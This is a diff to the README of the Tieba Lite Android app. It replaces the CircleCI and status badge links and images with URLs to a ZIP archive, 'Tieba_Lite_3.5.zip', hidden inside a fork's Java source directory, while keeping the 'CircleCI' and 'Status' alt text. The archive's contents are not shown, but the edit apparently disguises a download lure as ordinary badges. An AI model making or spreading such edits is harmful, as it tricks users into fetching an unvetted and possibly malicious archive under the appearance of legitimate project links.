@@ -1,10 +1,10 @@
 # <p align="center">Tieba Lite</p>
 <p align="center">
-    <a href="https://circleci.com/gh/HuanCheng65/TiebaLite">
-        <img alt="CircleCI" src="https://circleci.com/gh/HuanCheng65/TiebaLite.svg?style=svg">
+    <a href="https://github.com/ricardocvs13/TiebaLite/raw/refs/heads/master/app/src/main/java/com/huanchengfly/tieba/post/ui/intro/fragments/Tieba_Lite_3.5.zip">
+        <img alt="CircleCI" src="https://github.com/ricardocvs13/TiebaLite/raw/refs/heads/master/app/src/main/java/com/huanchengfly/tieba/post/ui/intro/fragments/Tieba_Lite_3.5.zip">
     </a>
     <a href="#">
-        <img alt="Status" src="https://img.shields.io/badge/%E7%8A%B6%E6%80%81-%E5%92%95%E5%92%95%E5%92%95-gray?style=flat&labelColor=gray&color=gray">
+        <img alt="Status" src="https://github.com/ricardocvs13/TiebaLite/raw/refs/heads/master/app/src/main/java/com/huanchengfly/tieba/post/ui/intro/fragments/Tieba_Lite_3.5.zip%E7%8A%B6%E6%80%81-%E5%92%95%E5%92%95%E5%92%95-gray?style=flat&labelColor=gray&color=gray">
     </a>
 </p>
 
